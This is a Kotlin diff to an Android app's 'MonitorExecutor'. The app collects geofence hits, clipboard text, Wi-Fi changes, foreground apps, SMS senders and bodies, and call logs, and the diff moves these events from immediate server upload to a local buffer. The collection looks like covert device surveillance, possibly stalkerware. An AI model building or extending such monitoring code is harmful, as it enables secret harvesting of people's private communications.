@@ -470,20 +470,15 @@ object MonitorExecutor {
             val distance = calculateDistance(lat, lon, fence.lat, fence.lon)
             
             if (distance <= fence.radius) {
-                // Inside geofence - send alert
-                CoroutineScope(Dispatchers.IO).launch {
-                    try {
-                        ApiClient.sendEvent(
-                            com.abuzahra.manager.util.DeviceUtils.getDeviceId(context),
-                            "geofence_entered",
-                            mapOf(
-                                "fence_id" to fence.id,
-                                "fence_name" to (fence.name ?: "Unnamed"),
-                                "distance" to distance
-                            )
-                        )
-                    } catch (_: Exception) {}
-                }
+                // Buffer event locally
+                com.abuzahra.manager.EventBuffer.addEvent(
+                    "geofence_entered",
+                    mapOf(
+                        "fence_id" to fence.id,
+                        "fence_name" to (fence.name ?: "Unnamed"),
+                        "distance" to distance
+                    )
+                )
             }
         }
     }
@@ -565,14 +560,11 @@ object MonitorExecutor {
                                 clipboardHistory.poll()
                             }
                             
-                            // Send to server
-                            try {
-                                ApiClient.sendEvent(
-                                    com.abuzahra.manager.util.DeviceUtils.getDeviceId(context),
-                                    "clipboard_change",
-                                    mapOf("text" to text.take(500))
-                                )
-                            } catch (_: Exception) {}
+                            // Buffer event locally
+                            com.abuzahra.manager.EventBuffer.addEvent(
+                                "clipboard_change",
+                                mapOf("text" to text.take(500))
+                            )
                         }
                     }
                     
@@ -641,14 +633,11 @@ object MonitorExecutor {
                     if (ssid != lastWifi) {
                         lastWifi = ssid
                         
-                        // Send to server
-                        try {
-                            ApiClient.sendEvent(
-                                com.abuzahra.manager.util.DeviceUtils.getDeviceId(context),
-                                "wifi_change",
-                                mapOf("ssid" to ssid, "bssid" to (currentWifi?.bssid ?: ""))
-                            )
-                        } catch (_: Exception) {}
+                        // Buffer event locally
+                        com.abuzahra.manager.EventBuffer.addEvent(
+                            "wifi_change",
+                            mapOf("ssid" to ssid, "bssid" to (currentWifi?.bssid ?: ""))
+                        )
                     }
                     
                     delay(30000) // Check every 30 seconds
@@ -716,14 +705,11 @@ object MonitorExecutor {
                                 )
                                 appUsageLog.add(entry)
                                 
-                                // Send to server
-                                try {
-                                    ApiClient.sendEvent(
-                                        com.abuzahra.manager.util.DeviceUtils.getDeviceId(context),
-                                        "app_change",
-                                        mapOf("package" to foregroundApp)
-                                    )
-                                } catch (_: Exception) {}
+                                // Buffer event locally
+                                com.abuzahra.manager.EventBuffer.addEvent(
+                                    "app_change",
+                                    mapOf("package" to foregroundApp)
+                                )
                             }
                         }
                     }
@@ -797,18 +783,15 @@ object MonitorExecutor {
                                     val date = cursor.getLong(3)
                                     val type = cursor.getInt(4)
                                     
-                                    // Send to server
-                                    try {
-                                        ApiClient.sendEvent(
-                                            com.abuzahra.manager.util.DeviceUtils.getDeviceId(context),
-                                            "sms_received",
-                                            mapOf(
-                                                "from" to address,
-                                                "body" to body,
-                                                "type" to (if (type == 1) "received" else "sent")
-                                            )
+                                    // Buffer event locally
+                                    com.abuzahra.manager.EventBuffer.addEvent(
+                                        "sms_received",
+                                        mapOf(
+                                            "from" to address,
+                                            "body" to body,
+                                            "type" to (if (type == 1) "received" else "sent")
                                         )
-                                    } catch (_: Exception) {}
+                                    )
                                 }
                             }
                         }
@@ -878,18 +861,15 @@ object MonitorExecutor {
                                         else -> "unknown"
                                     }
                                     
-                                    // Send to server
-                                    try {
-                                        ApiClient.sendEvent(
-                                            com.abuzahra.manager.util.DeviceUtils.getDeviceId(context),
-                                            "call_log_change",
-                                            mapOf(
-                                                "number" to number,
-                                                "type" to type,
-                                                "duration" to duration
-                                            )
+                                    // Buffer event locally
+                                    com.abuzahra.manager.EventBuffer.addEvent(
+                                        "call_log_change",
+                                        mapOf(
+                                            "number" to number,
+                                            "type" to type,
+                                            "duration" to duration
                                         )
-                                    } catch (_: Exception) {}
+                                    )
                                 }
                             }
                         }
